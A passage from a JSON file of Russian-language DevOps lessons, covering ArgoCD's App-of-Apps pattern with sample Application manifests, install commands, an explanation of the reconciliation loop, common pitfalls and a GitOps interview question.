    "step_by_step": "1. Установите ArgoCD в namespace `argocd`.\n2. Создайте корневой манифест `root-app.yaml` по паттерну App-of-Apps.\n3. Опишите дочернее приложение `order-service-app.yaml`.\n4. Включите автоматическую синхронизацию `automated: {prune: true, selfHeal: true}`.\n5. Запушьте изменение тега образа в Git и наблюдайте в UI ArgoCD автоматический Rolling Update.",
    "code_blocks": [
      {
        "filename": "root-application.yaml",
        "lang": "yaml",
        "code": "apiVersion: argoproj.io/v1alpha1\nkind: Application\nmetadata:\n  name: root-app-of-apps\n  namespace: argocd\n  finalizers:\n    - resources-finalizer.argocd.argoproj.io\nspec:\n  project: default\n  source:\n    repoURL: \"https://github.com/my-org/k8s-gitops-infra.git\"\n    targetRevision: HEAD\n    path: \"apps\" # Каталог, содержащий манифесты всех дочерних Application\n  destination:\n    server: \"https://kubernetes.default.svc\"\n    namespace: argocd\n  syncPolicy:\n    automated:\n      prune: true\n      selfHeal: true"
      },
      {
        "filename": "apps/order-service-app.yaml",
        "lang": "yaml",
        "code": "apiVersion: argoproj.io/v1alpha1\nkind: Application\nmetadata:\n  name: order-service\n  namespace: argocd\nspec:\n  project: default\n  source:\n    repoURL: \"https://github.com/my-org/order-service-manifests.git\"\n    targetRevision: main\n    path: \"overlays/prod\"\n  destination:\n    server: \"https://kubernetes.default.svc\"\n    namespace: production\n  syncPolicy:\n    automated:\n      prune: true\n      selfHeal: true\n    syncOptions:\n      - CreateNamespace=true"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Установка ArgoCD в выделенный namespace\nkubectl create namespace argocd\nkubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml\n\n# Ожидание готовности контроллера ArgoCD\nkubectl wait --namespace argocd --for=condition=ready pod --selector=app.kubernetes.io/name=argocd-server --timeout=90s\n\n# Применение корневого приложения App-of-Apps\nkubectl apply -f root-application.yaml\n\n# Просмотр статуса синхронизации приложений через ArgoCD CLI\nargocd app list"
      }
    ],
    "under_the_hood": "`argocd-application-controller` непрерывно выполняет цикл реконсиляции (Reconciliation Loop, по умолчанию раз в 3 минуты или немедленно по webhook от GitHub/GitLab). Контроллер клонирует Git-репозиторий, запускает рендеринг (`kustomize build` или `helm template`) и строит граф объектов. Затем он вызывает API Kubernetes для чтения live-состояния. При обнаружении расхождения контроллер выполняет Three-way Diff и накатывает изменения. При включенном `selfHeal` ручные правки инженеров в кластере откатываются обратно за секунды.",
    "pitfalls": "1. Ручные правки через `kubectl`: при включенном `selfHeal: true` любая попытка быстро исправить конфиг на бою через `kubectl edit` будет мгновенно отменена контроллером ArgoCD. Все изменения обязаны идти строго через Git commit.\n2. Циклическая синхронизация из-за мутирующих контроллеров: если HPA или VPA изменяет `replicas` или `resources`, а манифест в Git содержит фиксированное значение, ArgoCD будет бесконечно фиксировать Out-of-Sync. Решение — директива `ignoreDifferences` в спецификации Application.",
    "bigtech_interview": "**Вопрос с собеседования:** «Почему в GitOps-подходе доступ `kubectl` на запись в production-кластер полностью закрывается для разработчиков и даже DevOps-инженеров?»\n**Ответ:** Это фундамент концепции **NoOps / GitOps Compliance**: 1) Полная аудируемость: каждое изменение инфраструктуры зафиксировано в Git с автором, ревьюерами и обоснованием в Pull Request; 2) Воспроизводимость: при полной гибели кластера вся система поднимается с нуля за несколько минут накатом репозитория манифестов; 3) Безопасность: исключаются несанкционированные ручные изменения на проде в обход тестов и проверок безопасности."
  }
]
